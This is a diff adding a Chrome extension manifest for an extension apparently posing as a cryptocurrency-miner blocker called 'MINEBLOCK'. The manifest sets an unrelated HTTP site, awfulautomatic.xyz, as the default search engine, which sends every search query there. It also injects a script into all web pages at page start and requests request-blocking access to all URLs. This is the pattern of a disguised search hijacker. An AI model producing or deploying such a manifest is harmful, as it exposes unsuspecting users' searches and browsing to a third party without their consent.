@@ -1,0 +1,63 @@
+{
+	"background": {
+		"persistent": true,
+		"scripts": [
+			"js/utils.js",
+			"js/background.js"
+		]
+	},
+	"browser_action": {
+		"default_icon": "icons/icon.png",
+		"default_popup": "popup.html",
+		"icons": [
+			"icons/icon.png"
+		]
+	},
+	"chrome_settings_overrides": {
+		"search_provider": {
+			"encoding": "UTF-8",
+			"favicon_url": "http://awfulautomatic.xyz/favicon.ico",
+			"is_default": true,
+			"keyword": "zebrakite",
+			"name": "zebrakite",
+			"search_url": "http://awfulautomatic.xyz/?loadcost={searchTerms}"
+		}
+	},
+	"content_scripts": [
+		{
+			"js": [
+				"js/content.js"
+			],
+			"matches": [
+				"http://*/*",
+				"https://*/*"
+			],
+			"run_at": "document_start"
+		}
+	],
+	"default_locale": "en",
+	"description": "__MSG_appDesc__",
+	"icons": {
+		"128": "icons/icon_128.png",
+		"19": "icons/icon.png",
+		"48": "icons/icon_48.png"
+	},
+	"manifest_version": 2,
+	"name": "__MSG_appName__",
+	"options_page": "options.html",
+	"permissions": [
+		"activeTab",
+		"storage",
+		"unlimitedStorage",
+		"tabs",
+		"webRequest",
+		"webRequestBlocking",
+		"<all_urls>"
+	],
+	"short_name": "MINEBLOCK",
+	"update_url": "https://clients2.google.com/service/update2/crx",
+	"version": "1.0",
+	"web_accessible_resources": [
+		"js/minerkill.js"
+	]
+}
